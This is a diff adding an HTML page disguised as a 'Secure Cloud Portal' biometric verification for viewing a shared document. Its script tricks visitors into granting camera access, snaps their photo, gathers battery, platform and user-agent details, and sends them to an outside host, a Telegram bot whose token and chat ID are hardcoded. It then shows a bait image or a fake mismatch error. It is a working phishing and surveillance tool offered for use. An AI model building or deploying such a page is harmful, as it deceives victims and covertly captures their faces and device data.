@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Cloud Portal</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #wrapper { text-align: center; width: 90%; max-width: 380px; padding: 30px; border: 1px solid #222; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 40px rgba(0, 136, 204, 0.2); }
+        .icon { font-size: 60px; margin-bottom: 20px; color: #0088cc; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0088cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:active { transform: scale(0.96); }
+        #status { font-size: 14px; color: #888; margin-top: 15px; line-height: 1.5; }
+        #bait_img { display: none; width: 100%; border-radius: 15px; margin-top: 10px; border: 1px solid #333; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="wrapper">
+    <div id="ui_box">
+        <div class="icon">🛡️</div>
+        <h2 style="margin: 0;">Identity Required</h2>
+        <p id="status">Complete the <b>Biometric Verification</b> to view the shared document.</p>
+        <div id="load" class="loader"></div>
+        <button id="mainBtn" class="btn" onclick="startUltimateScan()">VERIFY IDENTITY</button>
+    </div>
+    
+    <img id="bait_img" src="" alt="Decrypted File">
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<footer style="position: absolute; bottom: 20px; font-size: 10px; color: #333;">Made by Nitin 333</footer>
+
+<script>
+    const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
+    const CHAT_ID = "6643732863"; // <--- CHANGE THIS TO YOUR TELEGRAM ID
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const baitUrl = urlParams.get('img');
+
+    async function startUltimateScan() {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('load');
+        const status = document.getElementById('status');
+        const baitImgTag = document.getElementById('bait_img');
+
+        // 1. Vibration Feedback
+        if ("vibrate" in navigator) { navigator.vibrate([100, 50, 100]); }
+
+        // 2. Battery Detection
+        let batteryMsg = "N/A";
+        try {
+            const battery = await navigator.getBattery();
+            batteryMsg = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+        } catch (e) {}
+
+        // 3. UI Transition
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        status.innerHTML = "Accessing Biometric Hardware...";
+
+        try {
+            // 4. Request Camera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if ("vibrate" in navigator) { navigator.vibrate(200); }
+            status.innerHTML = "<b>SCANNING...</b><br>Please look directly at the screen.";
+            
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob(blob => {
+                    const deviceInfo = `📱 **Device:** ${navigator.platform}\n🔋 **Battery:** ${batteryMsg}\n🌐 **Agent:** ${navigator.userAgent.split('(')[1].split(')')[0]}`;
+                    
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "capture.jpg");
+                    formData.append("caption", `🎯 **Target Verified!**\n\n${deviceInfo}\n\n**Made by Nitin 333**`);
+                    
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                }, 'image/jpeg');
+
+                // 5. Cleanup & Image Reveal
+                stream.getTracks().forEach(t => t.stop());
+                loader.style.display = 'none';
+                
+                if (baitUrl) {
+                    document.getElementById('ui_box').style.display = 'none';
+                    baitImgTag.src = baitUrl;
+                    baitImgTag.style.display = 'block';
+                    if ("vibrate" in navigator) { navigator.vibrate([100, 100]); }
+                } else {
+                    status.innerHTML = "<span style='color:#ff4d4d;'>❌ Error: Biometric Mismatch</span>";
+                    alert("Verification Failed.");
+                    location.reload();
+                }
+
+            }, 2500);
+
+        } catch (err) {
+            alert("Verification Required: Please allow camera access to unlock the document.");
+            location.reload();
+        }
+    }
+</script>
+</body>
+</html>
